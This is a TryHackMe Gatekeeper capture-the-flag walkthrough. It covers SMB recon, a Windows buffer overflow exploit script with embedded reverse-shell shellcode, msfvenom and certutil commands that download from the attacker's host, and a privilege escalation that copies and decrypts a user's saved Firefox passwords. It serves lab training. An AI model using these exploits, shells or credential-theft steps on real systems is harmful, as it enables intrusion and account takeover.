---
title: "TryHackMe Gatekeeper Walkthrough - Windows Buffer Overflow and Exploitation"
description: "Complete walkthrough of TryHackMe's Gatekeeper room focusing on Windows buffer overflow exploitation, reverse engineering, and privilege escalation."
keywords: ["tryhackme gatekeeper", "windows buffer overflow", "windows exploitation", "reverse engineering", "privilege escalation", "immunity debugger"]
tags: ["tryhackme", "windows", "buffer-overflow", "exploitation", "reverse-engineering"]
sidebar_position: 5
---

:::info Description

These are my notes for the [Gatekeeper Room](https://tryhackme.com/room/gatekeeper) on TryHackMe.

Credits: S/o to SnoOw, Kafka and Noodles for the assist on this box.

|OS|Level|Rating
|:---:|:-----:|:-----:|
|Windows|Medium|4/5|

:::

## RECON

### Scan

Initial recon with an nmap scan: `nmap -v -sV -Pn -p-54000 -o nmap-gatekeeper.txt $TARGET_IP`

```bash
# Nmap 7.92 scan initiated Tue Mar  1 20:43:11 2022 as: nmap -v -sV -Pn -p-54000 -o nmap-gatekeeper.txt 10.10.51.255
Increasing send delay for 10.10.51.255 from 0 to 5 due to 11 out of 31 dropped probes since last increase.
Increasing send delay for 10.10.51.255 from 80 to 160 due to 11 out of 12 dropped probes since last increase.
Nmap scan report for 10.10.51.255
Host is up (0.28s latency).
Not shown: 53989 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
31337/tcp open  Elite?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
49165/tcp open  msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.92%I=7%D=3/1%Time=621DDD81%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(
SF:SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20V
SF:ia:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@nm
SF:>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2 />\r!!!\nHello\x20Call-ID:\
SF:x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forwa
SF:rds:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:\
SF:x20<sip:nm@nm />\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x2
SF:0\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTTP
SF:Options,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")
SF:%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\r
SF:!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\x
SF:16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSessi
SF:onReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Four
SF:OhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2ebak
SF:\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01def
SF:ault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n");
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  1 21:49:31 2022 -- 1 IP address (1 host up) scanned in 3980.16 seconds
```

### Enumerate

I can see the 135, 139 ports are open so let's try `smbclient`: `smbclient -L //$TARGET_IP`

```bash
smbclient -L //10.10.51.255
Enter WORKGROUP\kali's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.51.255 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

now try `nmblookup`: `nmblookup -A $TARGET_IP`

```bash
nmblookup -A 10.10.51.255
Looking up status of 10.10.51.255
        GATEKEEPER      <00> -         B <ACTIVE />
        WORKGROUP       <00> - <GROUP /> B <ACTIVE />
        GATEKEEPER      <20> -         B <ACTIVE />
        WORKGROUP       <1e> - <GROUP /> B <ACTIVE />
        WORKGROUP       <1d> -         B <ACTIVE />
        ..__MSBROWSE__. <01> - <GROUP /> B <ACTIVE />

        MAC Address = 02-FD-26-02-B7-53
```

try nmap with smb-enumeration-shares script scanning: `nmap --script smb-enum-shares -p 139,445 $TARGET_IP`

```bash
nmap --script smb-enum-shares -p 139,445 10.10.51.255
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-01 20:20 NZDT
Nmap scan report for 10.10.51.255
Host is up (0.28s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.51.255\ADMIN$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none />
|     Current user access: <none />
|   \\10.10.51.255\C$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none />
|     Current user access: <none />
|   \\10.10.51.255\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ
|     Current user access: READ/WRITE
|   \\10.10.51.255\Users:
|     Type: STYPE_DISKTREE
|     Comment:
|     Anonymous access: <none />
|_    Current user access: READ

Nmap done: 1 IP address (1 host up) scanned in 52.79 seconds
```

try nmap with smb-vuln scanning: `nmap --script smb-vuln* -p 139,445 $TARGET_IP`

```bash
nmap --script smb-vuln* -p 139,445 10.10.51.255
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-01 20:23 NZDT
Nmap scan report for 10.10.51.255
Host is up (0.28s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 11.47 seconds
```

From nmap we can see this port open `31337` - let's try connecting to it:

```bash
nc 10.10.51.255 31337                                                                                     130 ⨯

Hello !!!
hi
Hello hi!!!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!!!
^C
```

Looks like it takes user input, buffer overflow potential.

Let's use smbclient to connect, maybe browse the shares that have read access:

```bash
┌──(kali㉿kali)-[~/…/RxHack/THM/OFFENSIVEPENTESTPATH/GATEKEEPER]
└─$ smbclient //10.10.51.255/Users -U anonymous -W WORKGROUP
Enter WORKGROUP\anonymous's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri May 15 13:57:08 2020
  ..                                 DR        0  Fri May 15 13:57:08 2020
  Default                           DHR        0  Tue Jul 14 19:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 16:54:24 2009
  Share                               D        0  Fri May 15 13:58:07 2020

                7863807 blocks of size 4096. 3874921 blocks available
smb: \> cd Share
dismb: \Share\> dir
  .                                   D        0  Fri May 15 13:58:07 2020
  ..                                  D        0  Fri May 15 13:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 17:27:17 2020

                7863807 blocks of size 4096. 3874921 blocks available
smb: \Share\> exit
```

Downloaded `gatekeeper.exe`, ran it on win7 box, but had to install M$ visual studio C++ (vc_redist.x86.exe) to get the program working.

## EXPLOIT

### Buffer Overflow Development

The scenario here is we have a target machine at THM, but now we have a copy of the application we can run locally, and figure out a buffer overflow exploit/payload, which we will in turn fire at the THM machine.

### Find the Offset

:::tip

Tip from noodles: do `offset.py` script with a big-ass number, use `pattern_create.rb -l <big number />` then `pattern_offset.rb -l <big number /> -q <EIP />` gives you the offset.

:::

Follow [Buffer Overflow Shortcut](/docs/hacker/bufferoverflow/resources) for the full technique.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 6700 -q 39654138                       130 ⨯
[*] Exact match at offset 146
```

### Control the EIP

Use this script to prove our offset is accurate and the EIP is overwritten with the 4x B's we put in the payload:

```python
#!/usr/bin/env python3

import socket

ip = "172.16.2.125" # note this is my local win7 vm ip address.
port = 31337

offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = overflow + retn + padding + payload + postfix

print("buffer=",len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Crash Overwrite EIP: 42424242...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

```

Run it!

```bash
./eip.py
buffer= 150
Crash Overwrite EIP: 42424242...
Done!
```

### Bad Character Check

Run through the bad character check process starting with the nullbyte array (`!mona bytearray -b "\x00"`).

Then compare:

`!mona compare -f C:\Users\IEUser\Downloads\gatekeeper\bytearray.bin -a 015419F8`

get a bad character list : `00 0a`

Generate a new bytearray with the new found bad characters:

`!mona bytearray -b "\x00\x0a"`

Compare:

`!mona compare -f C:\Users\IEUser\Downloads\gatekeeper\bytearray.bin -a 014D19F8`

Booya!

### Find the jmp Return Address

Find a module that doesn't have "Address Space Layout Randomization (ASLR)" memory protection:

`!mona jmp -r esp -cpb "\x00\x0a"`

```bash
Log data, item 4
 Address=080414C3
 Message=  0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Downloads\gatekeeper.exe)

Log data, item 3
 Address=080416BF
 Message=  0x080416bf : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Downloads\gatekeeper.exe)
```

Pick one.

I choose `080414C3` = little endian = `\xc3\x14\x04\x08`

### Shellcode: Local Box

Let's generate shellcode, minus the bad characters we've identified, with a reverse tcp shell, to connect back to a listener under our control.

`msfvenom -p windows/shell_reverse_tcp LHOST=$LAN_IP LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f c`

- `LHOST` is our local interface e.g. eth0
- we want port `80` to avoid detection
- `-b` dont use these characters for the shellcode
- `-f` format is C

run our listener in another terminal session- and when you run the exploit with your shellcode:

```python title="./payload-dev.py"

#!/usr/bin/env python3

import socket

ip = "172.16.2.125"
port = 31337

offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08" # found using mona
padding = "\x90" * 16
payload = (
"\xbd\xc6\x4a\xb9\xb1\xdb\xde\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x31\x68\x12\x83\xc0\x04\x03\xae\x44\x5b\x44\xd2\xb1\x19"
"\xa7\x2a\x42\x7e\x21\xcf\x73\xbe\x55\x84\x24\x0e\x1d\xc8\xc8"
"\xe5\x73\xf8\x5b\x8b\x5b\x0f\xeb\x26\xba\x3e\xec\x1b\xfe\x21"
"\x6e\x66\xd3\x81\x4f\xa9\x26\xc0\x88\xd4\xcb\x90\x41\x92\x7e"
"\x04\xe5\xee\x42\xaf\xb5\xff\xc2\x4c\x0d\x01\xe2\xc3\x05\x58"
"\x24\xe2\xca\xd0\x6d\xfc\x0f\xdc\x24\x77\xfb\xaa\xb6\x51\x35"
"\x52\x14\x9c\xf9\xa1\x64\xd9\x3e\x5a\x13\x13\x3d\xe7\x24\xe0"
"\x3f\x33\xa0\xf2\x98\xb0\x12\xde\x19\x14\xc4\x95\x16\xd1\x82"
"\xf1\x3a\xe4\x47\x8a\x47\x6d\x66\x5c\xce\x35\x4d\x78\x8a\xee"
"\xec\xd9\x76\x40\x10\x39\xd9\x3d\xb4\x32\xf4\x2a\xc5\x19\x91"
"\x9f\xe4\xa1\x61\x88\x7f\xd2\x53\x17\xd4\x7c\xd8\xd0\xf2\x7b"
"\x1f\xcb\x43\x13\xde\xf4\xb3\x3a\x25\xa0\xe3\x54\x8c\xc9\x6f"
"\xa4\x31\x1c\x3f\xf4\x9d\xcf\x80\xa4\x5d\xa0\x68\xae\x51\x9f"
"\x89\xd1\xbb\x88\x20\x28\x2c\x1b\xa4\x30\xc6\x0b\xc7\x34\x16"
"\x9c\x4e\xd2\x7c\x0c\x07\x4d\xe9\xb5\x02\x05\x88\x3a\x99\x60"
"\x8a\xb1\x2e\x95\x45\x32\x5a\x85\x32\xb2\x11\xf7\x95\xcd\x8f"
"\x9f\x7a\x5f\x54\x5f\xf4\x7c\xc3\x08\x51\xb2\x1a\xdc\x4f\xed"
"\xb4\xc2\x8d\x6b\xfe\x46\x4a\x48\x01\x47\x1f\xf4\x25\x57\xd9"
"\xf5\x61\x03\xb5\xa3\x3f\xfd\x73\x1a\x8e\x57\x2a\xf1\x58\x3f"
"\xab\x39\x5b\x39\xb4\x17\x2d\xa5\x05\xce\x68\xda\xaa\x86\x7c"
"\xa3\xd6\x36\x82\x7e\x53\x56\x61\xaa\xae\xff\x3c\x3f\x13\x62"
"\xbf\xea\x50\x9b\x3c\x1e\x29\x58\x5c\x6b\x2c\x24\xda\x80\x5c"
"\x35\x8f\xa6\xf3\x36\x9a"
)
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

you pop a shell and see the windows prompt!

```bash
sudo rlwrap nc -lnvp 80                                                                                     1 ⨯
listening on [any] 80 ...
connect to [172.16.2.106] from (UNKNOWN) [172.16.2.125] 49360
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\IEUser\Downloads>
```

Now that it works on the local box, we can try with some level of confidence, a payload for the TryHackMe box.

### Shellcode: TryHackMe Box

remember, change destination IP, and also LHOST in the msfvenom payload:

`msfvenom -p windows/shell_reverse_tcp LHOST=$VPN_IP LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f c`

- `LHOST` is our VPN interface (i.e. `tun0`) so the THM box can see it
- we want port `80` to avoid detection
- `-b` dont use these characters for the shellcode
- `-f` format is C

### Flag: user.txt

Once you pop a shell on the THM box, you can find the flag under the natbat user's Desktop folder:

```text
{**************}

The buffer overflow in this room is credited to Justin Steven and his
"dostackbufferoverflowgood" program.  Thank you!
```

## PRIVESC

### Attempt: Run as Admin

One idea we had (team effort on Twitch), was replace the `gatekeeper.exe` with a reverse shell, because there was a *.bat file that periodically started the gatekeeper service.

generate reverse shell exe to be run by Admin:

`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.55.83 LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f exe -o gatekee
per.exe`

upload from the first reverse shell using certutil:

`certutil -urlcache -split -f http://$VPN_IP/gatekeeper.exe gatekeeper.exe`

didn't work- program ran as gatekeeper user, not admin.

### Attempt: Firefox.lnk

checking files for clues, see this `Firefox.lnk` file:

```bash
type Desktop\Firefox.lnk
LF  j7j7        DGYr?DUk0~tCFSF1P AppDatatY^Hg3(ߟgVAGkﾕPP*AppDataBL1P LocalﾕPP*TULocald1P MOZILL~1ﾕPP*sMozilla Firefox^2P5  firefox.exeﾕPP*sfirefox.exe-8_KԾ:C:\Users\'\\GATEKEEPER\Usersnatbat\AppData\Local\Mozilla Firefox\firefox.exe,..\AppData\Local\Mozilla Firefox\firefox.exe-C:\Users\natbat\AppData\Local\Mozilla Firefox
                                                                                            |IJHK`Xgatekeeperj 8   }'t1j 8  1SPSXFL8C&mm.S-1-5-21-663372427-3699997616-3390412905-1003b1SPSU(Ly9K-

                                                                              54B4832DCE3D0EB51
```

Get to thinking "Firefox logins", google how to find firefox profiles and possible logins:

In our reverse shell:

```bash
dir logins.json /s /p
dir logins.json /s /p
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release

05/14/2020  09:43 PM               600 logins.json
```

so we've found the profile folder, and the `logins.json` file:

```bash
type logins.json
{"nextId":2,"logins":[{"id":1,"hostname":"https://creds.com","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECL2tyAh7wW+dBAh3qoYFOWUv1g==","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIcug4ROmqhOBBgUMhyan8Y8Nia4wYvo6LUSNqu1z+OT8HA=","guid":"{7ccdc063-ebe9-47ed-8989-0133460b4941}","encType":1,"timeCreated":1587502931710,"timeLastUsed":1587502931710,"timePasswordChanged":1589510625802,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>
```

At first I was told we just need a couple of files from, the `key4.db` and `logins.json` and I used nc.exe to upload `key4.db` file to kali box.

:::tip

Reference: _["Use nc for file transfers"](https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/)_

:::

I used a tool called [firefox_decrypt](https://github.com/unode/firefox_decrypt) to try and decrypt the firefox user accounts/logins, but got a bit tricky.

Instead, the following method worked flawlessly.

### Firepwd.py

Start by copying the entire firefox user profile from the THM box to your local machine, by copying it on the THM to the open "Share"

```bash
copy C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release` to `C:\Users\Share\profile
```

Next, from my kali machine, use `smb //$gatekeeper-ip/Users` to log in (make sure to be in the dir you want the files downloaded to), then used these settings to download the files to your local machine:

```bash
smbclient '\\server\share'
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
mget *
```

Now on my local I have the THM box firefox profile files.

#### Decrypt firefox logins

I used this `git clone https://github.com/lclevy/firepwd.git` to decrypt the firefox profile (note: `Share/` is where I downloaded files from the THM box):

```bash
python3 firepwd.py -d Share/
globalSalt: b'2d45b7ac4e42209a23235ecf825c018e0382291d'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'9e0554a19d22a773d0c5497efe7a80641fa25e2e73b2ddf3fbbca61d801c116d'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'b0da1db2992a21a74e7946f23021'
       }
     }
   }
   OCTETSTRING b'a713739460522b20433f7d0b49bfabdb'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'f1f75a319f519506d39986e15fe90ade00280879f00ae1e036422f001afc6267'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'dbd2424eabcf4be30180860055c8'
       }
     }
   }
   OCTETSTRING b'22daf82df08cfd8aa7692b00721f870688749d57b09cb1965dde5c353589dd5d'
 }
clearText b'86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808'
decrypting login/password pairs
   https://creds.com:b'mayor',b'8CL7O********IsV'
```

So you can see a `login/password` combo of `mayor/8CL7O********IsV`.

I use this with xfreerdp to RDP into the box as a user who has Admin permissions i.e. `mayor`:

`xfreerdp /u:mayor /p:8CL7O********IsV /v:$TARGET_IP`

login as mayor, who is in the admin group, and on their desktop is the `root.txt` flag:

### Flag: root.txt

`{Th3_M4*******************}`
